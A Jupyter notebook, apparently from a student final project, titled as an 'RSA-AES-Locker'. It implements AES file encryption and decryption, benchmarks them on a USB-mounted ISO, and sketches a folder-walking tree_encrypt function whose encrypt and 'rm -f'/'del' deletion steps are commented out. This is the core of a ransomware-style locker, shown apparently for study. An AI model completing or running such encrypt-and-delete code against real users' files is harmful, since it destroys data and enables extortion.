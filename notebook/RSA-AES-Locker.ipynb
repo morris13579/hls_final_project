{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "0f5440bc",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "from Crypto.Protocol.KDF import PBKDF2 \n",
    "from Crypto.Cipher import AES\n",
    "import numpy as np\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "02efd93d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/mnt/usb\n"
     ]
    }
   ],
   "source": [
    "%run ./linux_usb_mount.ipynb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "657f8090",
   "metadata": {},
   "outputs": [],
   "source": [
    "%run ./AES_Utils.ipynb"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d6f9253c",
   "metadata": {},
   "source": [
    "## File IO"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "f57013dd",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Make File\n",
    "def mkFile(fileName, content, mode='wb'):\n",
    "    try:\n",
    "        with open(fileName, mode) as f:\n",
    "            f.write(content)\n",
    "        return True\n",
    "    except:\n",
    "        return False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "fd60d527",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Read file\n",
    "def rdFile(fileName, lenth=-1, mode='rb'):\n",
    "    try:\n",
    "        with open(fileName, mode) as f:\n",
    "            if lenth < 0:\n",
    "                content = f.read()\n",
    "            else:\n",
    "                content = f.read(lenth)\n",
    "        return content\n",
    "    except:\n",
    "        return None"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f70c41a2",
   "metadata": {},
   "source": [
    "## Encrypt/Decrypt File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "5ff429cb",
   "metadata": {},
   "outputs": [],
   "source": [
    "encrypt_extention = '.ECRYP'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "20cf7d64",
   "metadata": {},
   "outputs": [],
   "source": [
    "def encryptFile(fileName, key, rename=None, batch_size_log2=24):\n",
    "    batch_size = int(2**batch_size_log2)\n",
    "    get_file_size = os.path.getsize(fileName)\n",
    "    file_size = get_file_size\n",
    "    if rename is None:\n",
    "        rename = fileName+encrypt_extention\n",
    "    try:\n",
    "        fr = open(fileName, 'rb')\n",
    "        fw = open(rename, 'wb')\n",
    "        #fw.write(b'ECRYP')\n",
    "        #fw.write(bytes([batch_size_log2]))\n",
    "        \n",
    "        while file_size>0:\n",
    "            content = fr.read(batch_size)\n",
    "            if file_size <= batch_size:\n",
    "                content = aesEncrypt(content, key, padding=True)\n",
    "            else:\n",
    "                content = aesEncrypt(content, key, padding=False)\n",
    "            fw.write(content)\n",
    "            file_size = file_size-batch_size\n",
    "    finally:\n",
    "        if fr:\n",
    "            fr.close()\n",
    "        if fw:\n",
    "            fw.close()\n",
    "    \n",
    "    return get_file_size"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "242288ab",
   "metadata": {},
   "outputs": [],
   "source": [
    "def decryptFile(fileName, key, rename=None, batch_size_log2=24):\n",
    "    if encrypt_extention == fileName[-len(encrypt_extention):]:\n",
    "        get_file_size = os.path.getsize(fileName)\n",
    "        file_size = get_file_size\n",
    "        if rename is None:\n",
    "            rename = fileName[:-len(encrypt_extention)]\n",
    "        try:\n",
    "            fr = open(fileName, 'rb')\n",
    "            #if fr.read(5) != b'ECRYP':\n",
    "            #    fr.close()\n",
    "            #    return False\n",
    "            #batch_size_log2 = int.from_bytes(fr.read(1), byteorder='big')\n",
    "\n",
    "            batch_size = 2**batch_size_log2\n",
    "            fw = open(rename, 'wb')\n",
    "\n",
    "            while file_size>0:\n",
    "                content = fr.read(batch_size)\n",
    "                if file_size <= batch_size:\n",
    "                    content = aesDecrypt(content, key, padding=True)\n",
    "                else:\n",
    "                    content = aesDecrypt(content, key, padding=False)\n",
    "                fw.write(content)\n",
    "                file_size = file_size-batch_size\n",
    "        finally:\n",
    "            if fr:\n",
    "                fr.close()\n",
    "            if fw:\n",
    "                fw.close()\n",
    "                \n",
    "        return True\n",
    "    else:\n",
    "        return False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "68e41211",
   "metadata": {},
   "outputs": [],
   "source": [
    "### Test Encrypt/Decrypt File"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2df2d381",
   "metadata": {},
   "source": [
    "## Test Encrypt & Decrypt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "c1c5dc68",
   "metadata": {},
   "outputs": [],
   "source": [
    "encrypt_file_source = \"Shakespeare_original.txt\"\n",
    "encrypt_file_rename = \"Shakespeare_ENDE.txt\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "96642f4a",
   "metadata": {},
   "outputs": [],
   "source": [
    "encrypt_file_source = \"ubuntu_original.iso\"\n",
    "encrypt_file_rename = \"ubuntu_ENDE.iso\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "f920190f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Encrypting: ubuntu_original.iso\n",
      "Duration: 236.051194 sec\n",
      "Encrypt done!\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(\"Encrypting: %s\"%(encrypt_file_source))\n",
    "time_start = time.time()\n",
    "encryptFile(os.path.join(usb_path, encrypt_file_source), key, rename = os.path.join(usb_path, encrypt_file_rename+encrypt_extention))\n",
    "time_stop = time.time()\n",
    "print(\"Duration: %f sec\"%(time_stop - time_start))\n",
    "print(\"Encrypt done!\\n\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "27b4af7d",
   "metadata": {},
   "outputs": [],
   "source": [
    "#r = cmd('mv %s %s'%(os.path.join(usb_path, encrypt_file_source+encrypt_extention), os.path.join(usb_path, encrypt_file_rename+encrypt_extention)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "3b363455",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Decrypting: ubuntu_ENDE.iso.ECRYP\n",
      "Duration: 214.336375 sec\n",
      "Decrypt done!\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(\"Decrypting: %s\"%(encrypt_file_rename+encrypt_extention))\n",
    "time_start = time.time()\n",
    "decryptFile(os.path.join(usb_path, encrypt_file_rename+encrypt_extention), key)\n",
    "time_stop = time.time()\n",
    "print(\"Duration: %f sec\"%(time_stop - time_start))\n",
    "print(\"Decrypt done!\\n\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "2c305145",
   "metadata": {},
   "outputs": [],
   "source": [
    "### Checksum"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7b505dc9",
   "metadata": {},
   "source": [
    "## Checksum"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "8a44750d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "29ca9a17aeb497f5dd79f267649aaf71  /mnt/usb/ubuntu_original.iso\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(cmd(\"md5sum %s\"%(os.path.join(usb_path, encrypt_file_source))))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "fd3e7dbc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "f5416aa419c6ef1941caf0832460a12a  /mnt/usb/ubuntu_ENDE.iso.ECRYP\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(cmd(\"md5sum %s\"%(os.path.join(usb_path, encrypt_file_rename+encrypt_extention))))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "4e6faa50",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "29ca9a17aeb497f5dd79f267649aaf71  /mnt/usb/ubuntu_ENDE.iso\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(cmd(\"md5sum %s\"%(os.path.join(usb_path, encrypt_file_rename))))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "fbc5464d",
   "metadata": {},
   "outputs": [],
   "source": [
    "def tree_encrypt(key, targetFolder = r'/mnt/usb/target'):\n",
    "    for root, dirs, files in os.walk(targetFolder):\n",
    "        for fileName in files:\n",
    "            fullFileName = os.path.join(root, fileName)\n",
    "            \n",
    "            if encrypt_extention in fullFileName:\n",
    "                continue\n",
    "            \n",
    "            print(fullFileName)\n",
    "            \n",
    "            # Encrypt\n",
    "            #encryptFile(os.path.join(usb_path, fullFileName), key)\n",
    "            # Delete file\n",
    "            #os.system('rm -f \"%s\"'%fullFileName)\n",
    "            #os.system('del \"%s\"'%fullFileName)\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5f3932b9",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "raw",
   "id": "71d91c93",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
